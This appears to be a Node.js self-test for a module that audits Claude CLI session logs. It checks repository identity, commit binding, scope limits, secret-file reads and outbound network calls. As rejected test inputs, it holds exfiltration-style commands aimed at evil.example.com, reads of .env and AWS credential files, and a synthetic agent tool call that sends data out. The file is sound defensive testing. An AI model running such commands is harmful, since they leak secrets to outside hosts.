#!/usr/bin/env node
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import process from 'node:process';
import { spawnSync } from 'node:child_process';
import { pathToFileURL } from 'node:url';

const moduleArg = process.argv[2];
if (!moduleArg) throw new Error('module path required');
const modulePath = path.resolve(moduleArg);
const {
  runLegacyImplementationAudit,
  validateLegacyAuditInput,
  classifyBashCommand,
  isSecretPath,
  toCanonicalPath,
  LEGACY_ELIGIBILITY_CUTOFF_UTC,
  LEGACY_REASONS,
} = await import(pathToFileURL(modulePath).href);

function assert(cond, msg) { if (!cond) throw new Error(msg); }

function git(cwd, args, extraEnv = {}) {
  const result = spawnSync('git', ['-C', cwd, ...args], {
    encoding: 'utf8', windowsHide: true, env: { ...process.env, ...extraEnv },
  });
  if (result.status !== 0) throw new Error(`git ${args.join(' ')} failed: ${result.stderr}`);
  return result.stdout;
}

function writeJsonl(filePath, records) {
  fs.writeFileSync(filePath, `${records.map((r) => JSON.stringify(r)).join('\n')}\n`, 'utf8');
}

const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'legacy-implementation-audit-selftest-'));

try {
  // --- schema identity ---
  assert(typeof LEGACY_ELIGIBILITY_CUTOFF_UTC === 'string' && LEGACY_ELIGIBILITY_CUTOFF_UTC.endsWith('Z'), 'cutoff must be a UTC instant');
  assert(LEGACY_REASONS.has('PRE_RECEIPT_WORK') && LEGACY_REASONS.has('NORMAL_ENTRY_MISSED_BEFORE_ENFORCEMENT'), 'legacy reason allowlist must match spec');
  assert(LEGACY_REASONS.size === 2, 'legacy reason allowlist must be closed');

  // --- unit checks: secret path / bash command classification ---
  assert(isSecretPath('.env') === true, '.env must be a secret path');
  assert(isSecretPath('.env.example') === false, '.env.example must be exempt');
  assert(isSecretPath('config/.ssh/id_rsa') === true, 'ssh key path must be secret');
  assert(isSecretPath('src/widget.ts') === false, 'ordinary source path must not be flagged secret');
  const repo = { owner: 'acme', name: 'widgets' };
  assert(classifyBashCommand('git commit -m "x"', repo).ok === true, 'plain git commit must classify safely');
  assert(classifyBashCommand('curl http://127.0.0.1:8080/health', repo).ok === true, 'loopback curl must be allowed');
  assert(classifyBashCommand('curl https://evil.example.com/exfil', repo).ok === false, 'non-loopback curl must be rejected');
  assert(classifyBashCommand('curl https://github.com/acme/widgets.git', repo).ok === true, 'same-origin GitHub reference must be allowed');
  assert(classifyBashCommand('cat .env', repo).ok === false, 'reading .env via Bash must be rejected');
  assert(classifyBashCommand('echo $(curl https://evil.example.com)', repo).ok === false, 'obfuscated command substitution must be rejected as ambiguous');

  // --- Windows/MSYS path canonicalization (toCanonicalPath) ---
  assert(toCanonicalPath('C:\\Users\\takeo\\source\\_worktrees\\repo') === 'c:/Users/takeo/source/_worktrees/repo', 'backslash drive path must canonicalize to lowercase-drive forward-slash form');
  assert(toCanonicalPath('C:/Users/takeo/source/_worktrees/repo') === 'c:/Users/takeo/source/_worktrees/repo', 'forward-slash drive path must canonicalize to lowercase-drive form');
  assert(toCanonicalPath('/c/Users/takeo/source/_worktrees/repo') === 'c:/Users/takeo/source/_worktrees/repo', 'MSYS-shaped /c/... path must canonicalize to the same lowercase-drive form');
  const spellingA = toCanonicalPath('C:\\Users\\takeo\\source\\_worktrees\\repo');
  const spellingB = toCanonicalPath('C:/Users/takeo/source/_worktrees/repo');
  const spellingC = toCanonicalPath('/c/Users/takeo/source/_worktrees/repo');
  assert(spellingA === spellingB && spellingB === spellingC, 'all three Windows/MSYS spellings of the same path must canonicalize identically');
  assert(toCanonicalPath('/d/Users/takeo/source/_worktrees/repo') !== spellingA, 'a different drive letter must NOT canonicalize equal to c:/...');
  assert(toCanonicalPath('c:/repo2/foo') !== toCanonicalPath('c:/repo/foo'), 'a sibling path with a similar prefix must NOT canonicalize equal (no prefix trick)');
  assert(toCanonicalPath('/tmp/foo') === '/tmp/foo', 'an arbitrary POSIX path must be left untouched, not reinterpreted as a Windows drive');
  assert(toCanonicalPath('/tmp/foo') !== toCanonicalPath('C:/tmp/foo'), 'an arbitrary POSIX path must never be treated as equal to a Windows drive path');

  // --- Bash absolute-path filesystem classification ---
  const bashRepoRoot = path.join(tempRoot, 'bash-repo');
  fs.mkdirSync(path.join(bashRepoRoot, 'src'), { recursive: true });
  const bashSynthRoot = path.join(tempRoot, 'bash-synth-root');
  fs.mkdirSync(bashSynthRoot, { recursive: true });
  const insideRepoFile = path.join(bashRepoRoot, 'src', 'widget.ts');
  const insideSynthFile = path.join(bashSynthRoot, 'fixture.json');
  const outsideDataFile = path.join(tempRoot, 'outside-bash-repo', 'business-data.csv');
  const outsideSecretFile = path.join(tempRoot, 'outside-bash-repo', '.aws', 'credentials');
  const msysInsideRepoFile = `/${insideRepoFile[0].toLowerCase()}${insideRepoFile.slice(2).replace(/\\/g, '/')}`;

  assert(classifyBashCommand('git status', repo, bashRepoRoot, []).ok === true, 'current-repo git command must PASS');
  assert(classifyBashCommand('gh pr view 42', repo, bashRepoRoot, []).ok === true, 'current-repo gh command with no explicit repo must PASS');
  assert(classifyBashCommand('curl http://127.0.0.1:9000/health', repo, bashRepoRoot, []).ok === true, 'loopback curl must PASS with repoRoot supplied');

  assert(classifyBashCommand(`cat "${insideRepoFile}"`, repo, bashRepoRoot, []).ok === true, 'Bash read inside repoRoot must PASS');
  assert(classifyBashCommand(`echo hi > "${insideRepoFile}"`, repo, bashRepoRoot, []).ok === true, 'Bash write inside repoRoot must PASS');
  assert(classifyBashCommand(`cat "${msysInsideRepoFile}"`, repo, bashRepoRoot, []).ok === true, 'MSYS-shaped path inside repoRoot must PASS');

  // --- root-boundary protection: no prefix tricks, ../ still normalized ---
  const siblingPrefixFile = path.join(`${bashRepoRoot}2`, 'notes.txt');
  const siblingPrefixResult = classifyBashCommand(`cat "${siblingPrefixFile}"`, repo, bashRepoRoot, []);
  assert(siblingPrefixResult.ok === false && siblingPrefixResult.code === 'PATH_OUTSIDE_REPO_ROOT_UNAUTHORIZED', 'a sibling directory sharing a string prefix with repoRoot (e.g. repo2) must NOT be treated as inside repoRoot');

  const dotDotEscapeCommand = `cat "${bashRepoRoot}\\src\\..\\..\\outside-bash-repo\\business-data.csv"`;
  const dotDotEscapeResult = classifyBashCommand(dotDotEscapeCommand, repo, bashRepoRoot, []);
  assert(dotDotEscapeResult.ok === false && dotDotEscapeResult.code === 'PATH_OUTSIDE_REPO_ROOT_UNAUTHORIZED', '../ segments that actually escape repoRoot must still be rejected after canonicalization');

  const dotDotStayInsideCommand = `cat "${bashRepoRoot}\\src\\..\\src\\widget.ts"`;
  assert(classifyBashCommand(dotDotStayInsideCommand, repo, bashRepoRoot, []).ok === true, '../ segments that resolve back inside repoRoot must still PASS');

  assert(classifyBashCommand(`cat "${insideSynthFile}"`, repo, bashRepoRoot, [bashSynthRoot]).ok === true, 'Bash read under allowed synthetic evidence root must PASS');
  assert(classifyBashCommand(`echo data > "${insideSynthFile}"`, repo, bashRepoRoot, [bashSynthRoot]).ok === true, 'Bash write under allowed synthetic evidence root must PASS');

  const outsideDataResult = classifyBashCommand(`cat "${outsideDataFile}"`, repo, bashRepoRoot, []);
  assert(outsideDataResult.ok === false && outsideDataResult.code === 'PATH_OUTSIDE_REPO_ROOT_UNAUTHORIZED', 'non-allowlisted external absolute data path must STOP');

  const outsideSecretResult = classifyBashCommand(`type "${outsideSecretFile}"`, repo, bashRepoRoot, []);
  assert(outsideSecretResult.ok === false && outsideSecretResult.code === 'SECRET_PATH_ACCESS_REJECTED', 'external secret path must STOP');

  const secretUnderAllowedRootResult = classifyBashCommand(`type "${outsideSecretFile}"`, repo, bashRepoRoot, [path.join(tempRoot, 'outside-bash-repo')]);
  assert(secretUnderAllowedRootResult.ok === false && secretUnderAllowedRootResult.code === 'SECRET_PATH_ACCESS_REJECTED', 'secret path must STOP even under an allow-listed root');

  const nodeExeResult = classifyBashCommand('"C:\\Program Files\\nodejs\\node.exe" --version', repo, bashRepoRoot, []);
  assert(nodeExeResult.ok === true, `system executable invocation outside repo must not fail solely for its own location: ${JSON.stringify(nodeExeResult)}`);
  const systemBinResult = classifyBashCommand('/usr/bin/git --version', repo, bashRepoRoot, []);
  assert(systemBinResult.ok === true, `system executable under /usr/bin must not fail solely for its own location: ${JSON.stringify(systemBinResult)}`);
  const execArgumentStillCheckedResult = classifyBashCommand(`"C:\\Program Files\\nodejs\\node.exe" "${outsideDataFile}"`, repo, bashRepoRoot, []);
  assert(execArgumentStillCheckedResult.ok === false && execArgumentStillCheckedResult.code === 'PATH_OUTSIDE_REPO_ROOT_UNAUTHORIZED', 'a data-file argument to an exempt executable is still checked against repoRoot/allowlist');

  assert(classifyBashCommand('gh pr view 42 -R acme/widgets', repo, bashRepoRoot, []).ok === true, 'gh -R with the same owner/name must PASS');
  const ghOtherRepoResult = classifyBashCommand('gh pr view 42 -R other/repo', repo, bashRepoRoot, []);
  assert(ghOtherRepoResult.ok === false && ghOtherRepoResult.code === 'GITHUB_REPOSITORY_MISMATCH', 'gh -R naming another repository must STOP');
  const ghApiOtherRepoResult = classifyBashCommand('gh api repos/other/repo/issues', repo, bashRepoRoot, []);
  assert(ghApiOtherRepoResult.ok === false && ghApiOtherRepoResult.code === 'GITHUB_REPOSITORY_MISMATCH', 'gh api naming another repository must STOP');
  const ghApiAmbiguousResult = classifyBashCommand('gh api graphql', repo, bashRepoRoot, []);
  assert(ghApiAmbiguousResult.ok === false && ghApiAmbiguousResult.code === 'GITHUB_REPOSITORY_MISMATCH', 'gh api with an ambiguous/unscoped endpoint must STOP');
  assert(classifyBashCommand('gh api repos/acme/widgets/issues', repo, bashRepoRoot, []).ok === true, 'gh api scoped to the same repository must PASS');

  // --- schema validation ---
  const validWindow = { startUtc: '2026-09-19T00:00:00Z', endUtc: '2026-09-21T00:00:00Z' };
  const baseSchemaPayload = {
    schemaVersion: 1,
    taskId: 'legacy-1',
    repoRoot: tempRoot,
    branch: 'feat/example',
    expectedHead: '0'.repeat(40),
    baseHead: '1'.repeat(40),
    repository: { owner: 'acme', name: 'widgets' },
    allowedScope: ['src/**'],
    implementationWindow: validWindow,
    legacyReason: 'PRE_RECEIPT_WORK',
    implementationAI: 'claude-cli',
    claudeEvidenceFiles: [path.join(tempRoot, 'evidence.jsonl')],
    currentHeadVerifications: {
      testGate: { status: 'PASS', head: '0'.repeat(40) },
      canonicalContract: { status: 'PASS', head: '0'.repeat(40) },
      humanDecisionSync: { status: 'PASS', head: '0'.repeat(40) },
      finalRealityCheck: { status: 'PASS', head: '0'.repeat(40) },
    },
  };
  assert(validateLegacyAuditInput(baseSchemaPayload).length === 0, `valid schema payload rejected: ${JSON.stringify(validateLegacyAuditInput(baseSchemaPayload))}`);
  assert(validateLegacyAuditInput({ ...baseSchemaPayload, implementationAI: 'gpt-4' }).includes('implementationAI_invalid'), 'non claude-cli implementationAI must fail schema');
  assert(validateLegacyAuditInput({ ...baseSchemaPayload, legacyReason: 'BECAUSE_I_SAID_SO' }).includes('legacyReason_invalid'), 'unknown legacyReason must fail schema');
  assert(validateLegacyAuditInput({ ...baseSchemaPayload, extra: 1 }).includes('unknown_field'), 'unknown field must fail schema');
  const missingVerification = { ...baseSchemaPayload.currentHeadVerifications };
  delete missingVerification.finalRealityCheck;
  assert(validateLegacyAuditInput({ ...baseSchemaPayload, currentHeadVerifications: missingVerification }).includes('currentHeadVerifications_invalid'), 'incomplete current-head verifications must fail schema');

  // --- build the PASS fixture repository ---
  const repoDirRaw = path.join(tempRoot, 'repo');
  fs.mkdirSync(repoDirRaw, { recursive: true });
  git(repoDirRaw, ['init', '-q']);
  git(repoDirRaw, ['config', 'user.email', 'legacy-audit@example.invalid']);
  git(repoDirRaw, ['config', 'user.name', 'Legacy Audit']);
  fs.writeFileSync(path.join(repoDirRaw, 'README.md'), 'hello\n', 'utf8');
  git(repoDirRaw, ['add', '-A']);
  git(repoDirRaw, ['commit', '-q', '-m', 'base']);
  git(repoDirRaw, ['branch', '-m', 'main']);
  const repoDir = fs.realpathSync(repoDirRaw);
  const baseHead = git(repoDir, ['rev-parse', 'HEAD']).trim().toLowerCase();

  const branch = 'feat/legacy-example';
  git(repoDir, ['checkout', '-q', '-b', branch]);
  git(repoDir, ['remote', 'add', 'origin', 'https://github.com/acme/widgets.git']);

  fs.mkdirSync(path.join(repoDir, 'src'), { recursive: true });
  fs.writeFileSync(path.join(repoDir, 'src', 'widget.ts'), 'export const widget = 1;\n', 'utf8');
  git(repoDir, ['add', '-A']);
  const commitDate = '2026-09-20T10:00:00+00:00';
  git(repoDir, ['commit', '-q', '-m', 'implement widget'], { GIT_COMMITTER_DATE: commitDate, GIT_AUTHOR_DATE: commitDate });
  const expectedHead = git(repoDir, ['rev-parse', 'HEAD']).trim().toLowerCase();

  const widgetPathAbs = path.join(repoDir, 'src', 'widget.ts');

  function buildValidRecords(sha, cwdForRecords = repoDir) {
    return [
      {
        type: 'assistant', sessionId: 'sess-1', cwd: cwdForRecords, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
        message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_edit', name: 'Edit', input: { file_path: widgetPathAbs, old_string: 'x', new_string: 'export const widget = 1;\n' } }] },
      },
      {
        type: 'assistant', sessionId: 'sess-1', cwd: cwdForRecords, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
        message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_commit', name: 'Bash', input: { command: 'git commit -m "implement widget"' } }] },
      },
      {
        type: 'user', sessionId: 'sess-1', cwd: cwdForRecords, gitBranch: branch,
        message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_commit', content: [{ type: 'text', text: `Committed as ${sha}` }] }] },
      },
    ];
  }

  // Windows/MSYS spelling of repoDir, e.g. "C:\foo\bar" -> "/c/foo/bar", as
  // actually emitted by Claude Code JSONL `cwd` fields under MSYS shells.
  function toMsysSpelling(windowsPath) {
    const m = /^([a-zA-Z]):[\\/](.*)$/.exec(windowsPath);
    if (!m) return windowsPath;
    return `/${m[1].toLowerCase()}/${m[2].replace(/\\/g, '/')}`;
  }

  const validEvidenceFile = path.join(tempRoot, 'evidence-valid.jsonl');
  writeJsonl(validEvidenceFile, buildValidRecords(expectedHead));

  const basePayload = {
    schemaVersion: 1,
    taskId: 'legacy-1',
    repoRoot: repoDir,
    branch,
    expectedHead,
    baseHead,
    repository: { owner: 'acme', name: 'widgets' },
    allowedScope: ['src/**'],
    forbiddenScope: ['docs/protected/**'],
    implementationWindow: validWindow,
    legacyReason: 'PRE_RECEIPT_WORK',
    implementationAI: 'claude-cli',
    claudeEvidenceFiles: [validEvidenceFile],
    currentHeadVerifications: {
      testGate: { status: 'PASS', head: expectedHead },
      canonicalContract: { status: 'PASS', head: expectedHead },
      humanDecisionSync: { status: 'PASS', head: expectedHead },
      finalRealityCheck: { status: 'PASS', head: expectedHead },
    },
  };

  // --- PASS ---
  const pass = runLegacyImplementationAudit(basePayload);
  assert(pass.result === 'PROCEED', `expected PROCEED: ${JSON.stringify(pass)}`);
  assert(pass.schema === 'LEGACY_IMPLEMENTATION_AUDIT_V1', 'schema identity must be exact');
  assert(pass.evidenceNature === 'LEGACY_CORROBORATION_NOT_RUNNER_ATTESTATION', 'evidenceNature identity must be exact');
  assert(pass.executionEvidence === undefined, 'legacy audit must never emit normal executionEvidence');
  assert(Array.isArray(pass.changedPaths) && pass.changedPaths.includes('src/widget.ts'), 'changed paths must include the implementation file');
  assert(Array.isArray(pass.commits) && pass.commits.includes(expectedHead), 'commits must include the implementation commit');

  // --- regression: MSYS-spelled JSONL cwd (/c/...) must PASS against a
  // repoRoot supplied in native Windows spelling (C:\...) ---
  const repoDirMsys = toMsysSpelling(repoDir);
  assert(repoDirMsys !== repoDir && repoDirMsys.startsWith('/'), `MSYS spelling helper must actually produce a /x/... path for this platform's repoDir: ${repoDirMsys}`);
  const msysCwdEvidenceFile = path.join(tempRoot, 'evidence-msys-cwd.jsonl');
  writeJsonl(msysCwdEvidenceFile, buildValidRecords(expectedHead, repoDirMsys));
  const msysCwdPass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [msysCwdEvidenceFile] });
  assert(msysCwdPass.result === 'PROCEED', `a synthetic legacy JSONL record with cwd in /c/... spelling must PASS when repoRoot is C:\\...: ${JSON.stringify(msysCwdPass)}`);

  // --- regression (PR #521 E2E false stop): a real Claude session's cwd
  // legitimately moves around inside the same repository across different
  // JSONL records -- repoRoot itself, or a nested subdirectory such as
  // docs/ui-reference/whole-app-ui-v1/v1/home or src-tauri. All of these
  // must PASS as the same repository; only paths that actually resolve
  // outside repoRoot must still STOP. ---

  // repoRoot itself => PASS
  const repoRootCwdEvidenceFile = path.join(tempRoot, 'evidence-cwd-reporoot-itself.jsonl');
  writeJsonl(repoRootCwdEvidenceFile, buildValidRecords(expectedHead, repoDir));
  const repoRootCwdPass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [repoRootCwdEvidenceFile] });
  assert(repoRootCwdPass.result === 'PROCEED', `evidence cwd exactly equal to repoRoot must PASS: ${JSON.stringify(repoRootCwdPass)}`);

  // nested cwd strictly inside repoRoot => PASS
  const nestedCwd = path.join(repoDir, 'docs', 'ui-reference', 'whole-app-ui-v1', 'v1', 'home');
  const nestedCwdEvidenceFile = path.join(tempRoot, 'evidence-cwd-nested.jsonl');
  writeJsonl(nestedCwdEvidenceFile, buildValidRecords(expectedHead, nestedCwd));
  const nestedCwdPass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [nestedCwdEvidenceFile] });
  assert(nestedCwdPass.result === 'PROCEED', `evidence cwd nested strictly inside repoRoot (e.g. docs/ui-reference/.../home) must PASS: ${JSON.stringify(nestedCwdPass)}`);

  // another nested cwd (src-tauri) => PASS
  const nestedCwd2 = path.join(repoDir, 'src-tauri');
  const nestedCwd2EvidenceFile = path.join(tempRoot, 'evidence-cwd-nested-src-tauri.jsonl');
  writeJsonl(nestedCwd2EvidenceFile, buildValidRecords(expectedHead, nestedCwd2));
  const nestedCwd2Pass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [nestedCwd2EvidenceFile] });
  assert(nestedCwd2Pass.result === 'PROCEED', `evidence cwd nested strictly inside repoRoot (e.g. src-tauri) must PASS: ${JSON.stringify(nestedCwd2Pass)}`);

  // MSYS /c/... spelling of a nested cwd => PASS
  const nestedCwdMsys = toMsysSpelling(nestedCwd);
  assert(nestedCwdMsys !== nestedCwd && nestedCwdMsys.startsWith('/'), `MSYS spelling helper must actually produce a /x/... path for this nested cwd: ${nestedCwdMsys}`);
  const nestedCwdMsysEvidenceFile = path.join(tempRoot, 'evidence-cwd-nested-msys.jsonl');
  writeJsonl(nestedCwdMsysEvidenceFile, buildValidRecords(expectedHead, nestedCwdMsys));
  const nestedCwdMsysPass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [nestedCwdMsysEvidenceFile] });
  assert(nestedCwdMsysPass.result === 'PROCEED', `an MSYS-spelled (/c/...) cwd nested strictly inside repoRoot must PASS: ${JSON.stringify(nestedCwdMsysPass)}`);

  // sibling directory sharing a string prefix (repoRoot2) => STOP
  const siblingPrefixCwd = `${repoDir}2`;
  const siblingPrefixCwdEvidenceFile = path.join(tempRoot, 'evidence-cwd-sibling-prefix.jsonl');
  writeJsonl(siblingPrefixCwdEvidenceFile, buildValidRecords(expectedHead, siblingPrefixCwd));
  const siblingPrefixCwdResult = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [siblingPrefixCwdEvidenceFile] });
  assert(siblingPrefixCwdResult.result === 'STOP' && siblingPrefixCwdResult.code === 'EVIDENCE_CWD_MISMATCH',
    `a sibling directory sharing a string prefix with repoRoot (e.g. repoRoot2) must STOP as EVIDENCE_CWD_MISMATCH: ${JSON.stringify(siblingPrefixCwdResult)}`);

  // ../ escape that actually resolves outside repoRoot => STOP. Built with a
  // literal '..' segment (not path.join, which would pre-collapse it) so the
  // module's own '..'-normalization is what is actually under test.
  const escapeCwd = `${repoDir}${path.sep}..${path.sep}${path.basename(repoDir)}-escaped`;
  const escapeCwdEvidenceFile = path.join(tempRoot, 'evidence-cwd-dotdot-escape.jsonl');
  writeJsonl(escapeCwdEvidenceFile, buildValidRecords(expectedHead, escapeCwd));
  const escapeCwdResult = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [escapeCwdEvidenceFile] });
  assert(escapeCwdResult.result === 'STOP' && escapeCwdResult.code === 'EVIDENCE_CWD_MISMATCH',
    `a ../ cwd that actually resolves outside repoRoot must STOP as EVIDENCE_CWD_MISMATCH: ${JSON.stringify(escapeCwdResult)}`);

  // ../ segments that resolve back inside repoRoot => PASS. Also built with
  // literal '..' segments for the same reason.
  const dotDotBackInsideCwd = `${repoDir}${path.sep}src${path.sep}..${path.sep}src`;
  const dotDotBackInsideEvidenceFile = path.join(tempRoot, 'evidence-cwd-dotdot-inside.jsonl');
  writeJsonl(dotDotBackInsideEvidenceFile, buildValidRecords(expectedHead, dotDotBackInsideCwd));
  const dotDotBackInsidePass = runLegacyImplementationAudit({ ...basePayload, claudeEvidenceFiles: [dotDotBackInsideEvidenceFile] });
  assert(dotDotBackInsidePass.result === 'PROCEED', `a ../ cwd that normalizes back inside repoRoot must PASS: ${JSON.stringify(dotDotBackInsidePass)}`);

  function stopCase(mutatedPayload, expectedCode, label) {
    const result = runLegacyImplementationAudit(mutatedPayload);
    assert(result.result === 'STOP', `${label}: expected STOP, got ${JSON.stringify(result)}`);
    assert(result.code === expectedCode, `${label}: expected code ${expectedCode}, got ${result.code} (${JSON.stringify(result)})`);
    assert(result.evidenceNature === 'LEGACY_CORROBORATION_NOT_RUNNER_ATTESTATION', `${label}: evidenceNature must still be present on STOP`);
  }

  // --- required STOP cases ---
  const noAssistantFile = path.join(tempRoot, 'evidence-no-assistant.jsonl');
  writeJsonl(noAssistantFile, [
    { type: 'user', sessionId: 'sess-2', cwd: repoDir, gitBranch: branch, message: { role: 'user', content: [{ type: 'text', text: 'I used Claude to fix things.' }] } },
  ]);
  stopCase({ ...basePayload, claudeEvidenceFiles: [noAssistantFile] }, 'NO_CLAUDE_ASSISTANT_EVIDENCE', 'no Claude evidence');

  stopCase({ ...basePayload, repository: { owner: 'someone-else', name: 'widgets' } }, 'REPOSITORY_IDENTITY_MISMATCH', 'repository mismatch');
  stopCase({ ...basePayload, branch: 'feat/other-branch' }, 'BRANCH_MISMATCH', 'branch mismatch');
  stopCase({ ...basePayload, expectedHead: baseHead }, 'EXPECTED_HEAD_MISMATCH', 'HEAD mismatch');
  stopCase({ ...basePayload, expectedChangedPaths: ['some/other/path.ts'] }, 'CHANGED_PATHS_MISMATCH', 'changed path mismatch');
  stopCase({ ...basePayload, forbiddenScope: ['src/**'] }, 'FORBIDDEN_SCOPE_VIOLATION', 'forbidden scope path');

  const implementationAiErrors = validateLegacyAuditInput({ ...basePayload, implementationAI: 'codex-cli' });
  assert(implementationAiErrors.includes('implementationAI_invalid'), 'implementationAI unknown/not claude-cli must fail closed');
  stopCase({ ...basePayload, implementationAI: 'codex-cli' }, 'SCHEMA_INVALID', 'implementationAI unknown/not claude-cli');

  stopCase({ ...basePayload, expectedEvidenceSha256: { [validEvidenceFile]: '0'.repeat(64) } }, 'EVIDENCE_TAMPERED', 'evidence SHA tamper');

  const nonPassVerifications = {
    ...basePayload.currentHeadVerifications,
    testGate: { status: 'FAIL', head: expectedHead },
  };
  stopCase({ ...basePayload, currentHeadVerifications: nonPassVerifications }, 'CURRENT_HEAD_VERIFICATION_INVALID', 'current-HEAD verification non-PASS');
  const mismatchedHeadVerifications = {
    ...basePayload.currentHeadVerifications,
    finalRealityCheck: { status: 'PASS', head: baseHead },
  };
  stopCase({ ...basePayload, currentHeadVerifications: mismatchedHeadVerifications }, 'CURRENT_HEAD_VERIFICATION_INVALID', 'current-HEAD verification head mismatch');
  const incompleteVerifications = { ...basePayload.currentHeadVerifications };
  delete incompleteVerifications.humanDecisionSync;
  stopCase({ ...basePayload, currentHeadVerifications: incompleteVerifications }, 'SCHEMA_INVALID', 'current-HEAD verification incomplete');

  // --- commit not bound to Claude ---
  const notBoundFile = path.join(tempRoot, 'evidence-not-bound.jsonl');
  writeJsonl(notBoundFile, [
    buildValidRecords(expectedHead)[0],
    buildValidRecords(expectedHead)[1],
    {
      type: 'user', sessionId: 'sess-1', cwd: repoDir, gitBranch: branch,
      message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_commit', content: [{ type: 'text', text: 'Committed successfully.' }] }] },
    },
  ]);
  stopCase({ ...basePayload, claudeEvidenceFiles: [notBoundFile] }, 'COMMIT_NOT_BOUND_TO_CLAUDE', 'commit not bound to Claude');

  // --- abbreviated SHA binding (Git-resolved only) ---
  const abbrevPass = (text) => {
    const file = path.join(tempRoot, `evidence-abbrev-${Math.random().toString(16).slice(2)}.jsonl`);
    const records = buildValidRecords(expectedHead);
    records[2].message.content[0].content = [{ type: 'text', text }];
    writeJsonl(file, records);
    return { ...basePayload, claudeEvidenceFiles: [file] };
  };
  const flipHex = (c) => (c === '0' ? '1' : '0');
  const abbrev7 = abbrevPass(`[${branch} ${expectedHead.slice(0, 7)}] implement widget`);
  const abbrev7Result = runLegacyImplementationAudit(abbrev7);
  assert(abbrev7Result.result === 'PROCEED', `unique 7-char abbreviation resolving to the audited commit must PASS: ${JSON.stringify(abbrev7Result)}`);
  const fullBind = runLegacyImplementationAudit(abbrevPass(`Committed as ${expectedHead}`));
  assert(fullBind.result === 'PROCEED', `full 40-char SHA binding must still PASS: ${JSON.stringify(fullBind)}`);
  stopCase(abbrevPass(`[${branch} ${expectedHead.slice(0, 6)}] implement widget`), 'COMMIT_NOT_BOUND_TO_CLAUDE', 'abbreviation under 7 chars');
  stopCase(abbrevPass(`[${branch} ${flipHex(expectedHead[0])}${expectedHead.slice(1, 7)}] implement widget`), 'COMMIT_NOT_BOUND_TO_CLAUDE', 'wrong-prefix abbreviation');
  stopCase(abbrevPass(`[${branch} ${expectedHead.slice(0, 6)}${flipHex(expectedHead[6])}] implement widget`), 'COMMIT_NOT_BOUND_TO_CLAUDE', 'unresolvable abbreviation');
  stopCase(abbrevPass(`[${branch} ${baseHead.slice(0, 7)}] implement widget`), 'COMMIT_NOT_BOUND_TO_CLAUDE', 'abbreviation resolving to another commit');

  // --- malformed JSONL ---
  const malformedFile = path.join(tempRoot, 'evidence-malformed.jsonl');
  fs.writeFileSync(malformedFile, `${JSON.stringify(buildValidRecords(expectedHead)[0])}\n{not valid json\n`, 'utf8');
  stopCase({ ...basePayload, claudeEvidenceFiles: [malformedFile] }, 'EVIDENCE_JSON_MALFORMED', 'malformed JSONL');

  // --- secret path access ---
  const secretFile = path.join(tempRoot, 'evidence-secret.jsonl');
  writeJsonl(secretFile, [
    ...buildValidRecords(expectedHead),
    {
      type: 'assistant', sessionId: 'sess-1', cwd: repoDir, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
      message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_read_secret', name: 'Read', input: { file_path: path.join(repoDir, '.env') } }] },
    },
  ]);
  stopCase({ ...basePayload, claudeEvidenceFiles: [secretFile] }, 'SECRET_PATH_ACCESS_REJECTED', 'secret path access');

  // --- external non-allowlisted path ---
  const externalFile = path.join(tempRoot, 'evidence-external.jsonl');
  const outsidePath = path.join(tempRoot, 'outside-repo', 'notes.txt');
  writeJsonl(externalFile, [
    ...buildValidRecords(expectedHead),
    {
      type: 'assistant', sessionId: 'sess-1', cwd: repoDir, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
      message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_read_external', name: 'Read', input: { file_path: outsidePath } }] },
    },
  ]);
  stopCase({ ...basePayload, claudeEvidenceFiles: [externalFile] }, 'PATH_OUTSIDE_REPO_ROOT_UNAUTHORIZED', 'external non-allowlisted path');

  const allowlistedFile = path.join(tempRoot, 'evidence-allowlisted-external.jsonl');
  writeJsonl(allowlistedFile, [
    ...buildValidRecords(expectedHead),
    {
      type: 'assistant', sessionId: 'sess-1', cwd: repoDir, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
      message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_read_external_ok', name: 'Read', input: { file_path: outsidePath } }] },
    },
  ]);
  const allowlistedPass = runLegacyImplementationAudit({
    ...basePayload,
    claudeEvidenceFiles: [allowlistedFile],
    allowedSyntheticEvidenceRoots: [path.join(tempRoot, 'outside-repo')],
  });
  assert(allowlistedPass.result === 'PROCEED', `an explicitly allow-listed synthetic evidence root must still pass: ${JSON.stringify(allowlistedPass)}`);

  // --- non-loopback network access ---
  const networkFile = path.join(tempRoot, 'evidence-network.jsonl');
  writeJsonl(networkFile, [
    ...buildValidRecords(expectedHead),
    {
      type: 'assistant', sessionId: 'sess-1', cwd: repoDir, gitBranch: branch, version: '2.1.0', entrypoint: 'cli',
      message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_curl', name: 'Bash', input: { command: 'curl https://evil.example.com/exfiltrate' } }] },
    },
  ]);
  stopCase({ ...basePayload, claudeEvidenceFiles: [networkFile] }, 'NETWORK_ACCESS_NON_LOOPBACK', 'non-loopback network access');

  // --- post-cutoff commit / new-work ineligibility ---
  const lateRepoDirRaw = path.join(tempRoot, 'repo-late');
  fs.mkdirSync(lateRepoDirRaw, { recursive: true });
  git(lateRepoDirRaw, ['init', '-q']);
  git(lateRepoDirRaw, ['config', 'user.email', 'legacy-audit@example.invalid']);
  git(lateRepoDirRaw, ['config', 'user.name', 'Legacy Audit']);
  fs.writeFileSync(path.join(lateRepoDirRaw, 'README.md'), 'hello\n', 'utf8');
  git(lateRepoDirRaw, ['add', '-A']);
